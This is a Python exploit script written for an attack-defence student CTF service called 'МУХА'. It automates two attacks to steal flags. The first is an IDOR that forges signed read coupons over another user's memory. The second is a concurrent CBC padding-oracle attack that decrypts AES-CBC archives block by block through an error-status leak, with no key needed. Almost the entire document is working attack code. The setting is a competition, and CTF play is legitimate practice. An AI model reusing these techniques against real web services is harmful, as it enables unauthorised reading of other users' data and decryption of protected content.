"""muha exploit — A&D Student CTF 2026, service "МУХА" (:8000).

Two independent bugs (confirmed from the service source on our own vulnbox):

1) coupon-forge IDOR: POST /api/coupons signs a read-permit document
   {subject: caller, object_id: <ANY string>} without checking object_id belongs to
   the caller. POST /api/memories/<mid>/read admits a non-owner whose signed document
   has subject==caller and object_id==mid. => forge a coupon over the victim memory,
   read it. (Cheap; patched on some boxes.)

2) CBC padding oracle: GET /api/memories/<mid>/capsule leaks any memory's `archive`
   (IDOR) — AES-CBC(iv+ct) of JSON {"owner","title","content"} under one shared
   archive_key. POST /api/archives/preview returns 422 on bad PKCS7 padding but a
   different status otherwise, a textbook padding oracle: recover `content` (the flag)
   from the archive without the key, no ownership needed.

flag_id = ForcAD attack-data hint, JSON string {"fly_id":..,"memory_id":..}.
"""
import base64
import concurrent.futures as _cf
import json
import re
import secrets
import sys
import threading
import time
import urllib.error
import urllib.request
import http.cookiejar

TIMEOUT = 5
ORACLE_WORKERS = 32          # sockets per in-flight exploit; keep farm max_workers low
ORACLE_BUDGET = 30.0         # wall-clock seconds for one memory's padding-oracle run
FLAG_RE = re.compile(r"[A-Z0-9]{31}=")


def _client():
    cj = http.cookiejar.CookieJar()
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))


def _call(op, url, data=None, timeout=TIMEOUT):
    body = json.dumps(data).encode() if data is not None else None
    req = urllib.request.Request(
        url, data=body, headers={"Content-Type": "application/json"},
        method="POST" if data is not None else "GET")
    try:
        r = op.open(req, timeout=timeout)
        return r.status, json.loads(r.read().decode("utf-8", "replace"))
    except urllib.error.HTTPError as e:
        try:
            return e.code, json.loads(e.read().decode("utf-8", "replace"))
        except Exception:
            return e.code, {}
    except Exception:
        return 0, {}


def _status(op, url, data):
    """Return just the HTTP status of a preview call (padding oracle)."""
    body = json.dumps(data).encode()
    req = urllib.request.Request(url, data=body, headers={"Content-Type": "application/json"}, method="POST")
    try:
        return op.open(req, timeout=TIMEOUT).status
    except urllib.error.HTTPError as e:
        return e.code
    except Exception:
        return 0


def _hint(flag_id):
    if isinstance(flag_id, dict):
        return flag_id
    if isinstance(flag_id, str):
        try:
            return json.loads(flag_id)
        except Exception:
            return {"memory_id": flag_id}
    return {}


def _b64u(data):
    return base64.urlsafe_b64encode(data).decode().rstrip("=")


def _unb64(value):
    value = value.strip().replace("-", "+").replace("_", "/")
    return base64.b64decode(value + "=" * (-len(value) % 4))


def _register(op, base):
    u = "fw" + secrets.token_hex(8)
    sc, me = _call(op, base + "/api/register", {"username": u, "password": "brainworm-" + secrets.token_hex(5)})
    return me.get("id") if sc in (200, 201) and isinstance(me, dict) else None


def _try_coupon(op, base, mid):
    sc, fly = _call(op, base + "/api/flies", {"name": "w", "profession": "Диджей"})
    if "id" not in fly:
        return []
    sc, cp = _call(op, base + "/api/coupons", {"fly_id": fly["id"], "object_id": mid})
    token = cp.get("token") if isinstance(cp, dict) else None
    if not token:
        return []
    sc, rd = _call(op, base + "/api/memories/%s/read" % mid, {"token": token})
    out = []
    if isinstance(rd, dict):
        for v in rd.values():
            if isinstance(v, str):
                out += FLAG_RE.findall(v)
    return out


def _oracle_valid(op, url, prefix16, ct_block):
    # valid PKCS7 padding => server does NOT return 422
    return _status(op, url, {"archive": _b64u(bytes(prefix16) + bytes(ct_block))}) != 422


def _find_byte(op, url, forged, idx, ct, candidates):
    """Return every candidate byte at position idx that yields valid padding (concurrent)."""
    hits = []
    lock = threading.Lock()

    def check(b):
        f = bytearray(forged)
        f[idx] = b
        if _oracle_valid(op, url, f, ct):
            with lock:
                hits.append(b)
    with _cf.ThreadPoolExecutor(max_workers=ORACLE_WORKERS) as ex:
        list(ex.map(check, candidates))
    return hits


def _decrypt_block(op, url, prev, ct, deadline):
    """CBC padding oracle: recover one plaintext block (prev=preceding ciphertext/IV)."""
    inter = bytearray(16)   # D(ct)
    forged = bytearray(16)
    for pad in range(1, 17):
        if time.time() > deadline:
            return None
        idx = 16 - pad
        hits = _find_byte(op, url, forged, idx, ct, range(256))
        if pad == 1 and (len(hits) == 0 or len(hits) > 6):
            # no discrimination => preview is not a padding oracle (patched/uniform errors)
            return None
        chosen = None
        if pad == 1 and len(hits) > 1:
            # disambiguate the real 0x01 from an accidental 0x02 0x02..
            for b in hits:
                f = bytearray(forged); f[idx] = b; f[idx - 1] ^= 0xFF
                if _oracle_valid(op, url, f, ct):
                    chosen = b
                    break
        if chosen is None:
            chosen = hits[0] if hits else None
        if chosen is None:
            return None
        inter[idx] = chosen ^ pad
        for j in range(idx, 16):            # re-seed tail for the next pad value
            forged[j] = inter[j] ^ (pad + 1)
    return bytes(inter[i] ^ prev[i] for i in range(16))


def _padding_oracle(op, base, mid):
    sc, cap = _call(op, base + "/api/memories/%s/capsule" % mid)
    if not isinstance(cap, dict) or not cap.get("archive"):
        return []
    try:
        raw = _unb64(cap["archive"])
    except Exception:
        return []
    if len(raw) < 32 or len(raw) % 16:
        return []
    url = base + "/api/archives/preview"
    blocks = [raw[i:i + 16] for i in range(0, len(raw), 16)]  # blocks[0] = IV
    plain = b""
    deadline = time.time() + ORACLE_BUDGET
    # decrypt from the LAST block backwards; the flag lives in "content" at the tail
    for k in range(len(blocks) - 1, 0, -1):
        pt = _decrypt_block(op, url, blocks[k - 1], blocks[k], deadline)
        if pt is None:
            break
        plain = pt + plain
        m = FLAG_RE.search(plain.decode("utf-8", "replace"))
        if m:
            return [m.group(0)]
    return FLAG_RE.findall(plain.decode("utf-8", "replace"))


def exploit(host, port, flag_id):
    hint = _hint(flag_id)
    mid = hint.get("memory_id") or hint.get("id")
    if not mid:
        return []
    base = "http://%s:%d" % (host, int(port))
    op = _client()
    if _register(op, base) is None:
        return []
    flags = _try_coupon(op, base, mid)      # cheap first; works on unpatched coupon
    if flags:
        return list(dict.fromkeys(flags))
    flags = _padding_oracle(op, base, mid)  # fallback: works while capsule+preview leak
    return list(dict.fromkeys(flags))


if __name__ == "__main__":
    print(exploit(sys.argv[1], int(sys.argv[2]), sys.argv[3] if len(sys.argv) > 3 else None))
